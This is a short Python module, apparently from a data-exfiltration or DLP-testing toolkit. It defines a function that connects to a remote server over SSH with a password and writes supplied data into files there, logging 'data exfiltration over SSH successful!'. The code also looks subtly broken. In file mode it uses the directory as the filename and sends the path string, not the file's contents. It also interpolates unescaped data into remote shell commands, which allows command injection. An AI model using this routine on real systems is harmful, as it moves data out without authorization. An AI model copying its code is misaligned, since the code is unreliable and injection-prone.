import logging
import fabric
import os
from utils.strings import genRandomFilename

# exfiltrate data over SSH
def exfilSSH(server, port, username, password, data, File=False):
    logging.debug("Using SSH exfiltration")
    try:
        filename = ""
        if not File:
            if isinstance(data, list):
                logging.debug("data is a list, converting to string")
                data = ','.join(data)

        if File:
            logging.debug("data is a file")
            if data == "":
                logging.error("No file")
                return False
            else:
                if not os.path.isfile(data):
                    logging.error("Bad filepath")
                    return False
                else:
                    logging.debug("Reading file")
                    head, tail = os.path.split(data)
                    filename = head

            logging.debug(f"writing file to remote host as dlpd_ssh_{filename}")
            c = fabric.Connection(server, port=port, user=username, connect_kwargs={'password': password}).run(f'printf "%b" "{data}" > dlpd_ssh_{filename}')
        else:
            logging.debug("data is a string")
            c = fabric.Connection(server, port=port, user=username, connect_kwargs={'password': password}).run(f'echo "{data}" >> dlpd_ssh_{genRandomFilename()}.txt')

        logging.debug("data exfiltration over SSH successful!")
        return True
    except Exception as e:
        logging.error(f"Failed to exfiltrate data over SSH: {e}")
        return False
